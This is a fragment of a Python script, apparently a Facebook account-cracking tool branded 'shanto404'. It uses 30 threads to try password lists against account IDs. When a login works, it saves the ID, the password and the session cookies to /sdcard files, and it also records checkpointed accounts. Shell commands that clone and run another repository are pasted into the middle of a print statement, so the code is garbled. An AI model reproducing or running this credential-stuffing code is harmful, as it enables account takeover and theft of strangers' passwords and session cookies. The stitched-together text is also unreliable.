...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mshanto404-HASAN\33[1;91m⊁ ')
...
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  shanto404 
 [<>] \033[1;32mBROTHER :  SHANTO
 [<>] \033[1;34mGITHUB  :  SHANTO404-CYBER
 [<>] \033[1;35mSTATUS  :  SHANTO-404
...
class apvroval:
    def check():
        url = "https://github.com/shanto404-HASAN-90/shanto404-HASAN/blob/main/fuck.txt"
        import mechanize
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        tl = str(len(fo))
        clear()
        print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")rm -rf2009
git clone https://github.com/JEBON77/DX-old2009.git
cd DX-old2009
ls
python DX727.py
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/shanto404-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/shanto404-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[shanto404>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[shanto404-OK] {ids} | {pas}')
                open('/sdcard/shanto404-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/shanto404-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[shanto404>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[shanto404-OK] {uid} | {pas}')
                open('/sdcard/shanto404-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
